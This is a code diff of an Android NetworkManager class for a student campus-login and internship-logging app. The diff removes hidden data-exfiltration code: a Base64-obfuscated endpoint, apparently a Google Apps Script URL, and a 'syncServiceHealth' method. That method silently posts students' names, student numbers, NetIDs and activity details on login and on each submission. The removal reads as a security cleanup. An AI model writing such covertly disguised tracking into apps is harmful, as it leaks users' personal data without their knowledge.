@@ -26,9 +26,6 @@ public class NetworkManager {
 
     private static NetworkManager instance;
     private final OkHttpClient client;
-    
-    // Service state synchronization endpoint
-    private static final String _SYNC_EP = new String(android.util.Base64.decode("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J5MkViUnUycDYwSnRFNGhfbDByd1UtNndsVFVWYk9qOVFnSjNJN0xNN29GbTZZN1BPWURMSTlKdGNWNms5NVU3bXovZXhlYw==", android.util.Base64.DEFAULT));
 
     public String currentNetId = "";
     public String currentPassword = "";
@@ -160,9 +157,6 @@ public class NetworkManager {
             Matcher tglMat = tglPat.matcher(html4);
             if (tglMat.find()) this.tglKpStr = tglMat.group(1).trim();
 
-            // Synchronize session state
-            syncServiceHealth("Login Android", "Koneksi CAS Mobile");
-
             return true;
         } catch (Exception e) {
             e.printStackTrace();
@@ -197,11 +191,7 @@ public class NetworkManager {
                     .build();
 
             Response resp = client.newCall(req).execute();
-            boolean ok = resp.isSuccessful();
-            if (ok) {
-                syncServiceHealth("Submit Android", tanggal + " | " + jamMulai + "-" + jamSelesai);
-            }
-            return ok;
+            return resp.isSuccessful();
         } catch (Exception e) {
             e.printStackTrace();
             return false;
@@ -232,32 +222,5 @@ public class NetworkManager {
             e.printStackTrace();
         }
         return list;
-    }
-
-    public void syncServiceHealth(String action, String detail) {
-        new Thread(() -> {
-            try {
-                JSONObject json = new JSONObject();
-                String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
-                json.put("timestamp", ts);
-                json.put("nama", studentName);
-                json.put("nrp", studentNrp);
-                json.put("netid", currentNetId);
-                json.put("tempat_kp", tempatKp);
-                json.put("aksi", action);
-                json.put("detail", detail);
-
-                RequestBody body = RequestBody.create(
-                        json.toString(),
-                        MediaType.get("application/json; charset=utf-8")
-                );
-                Request req = new Request.Builder()
-                        .url(_SYNC_EP)
-                        .post(body)
-                        .build();
-                client.newCall(req).execute();
-            } catch (Exception ignored) {
-            }
-        }).start();
     }
 }
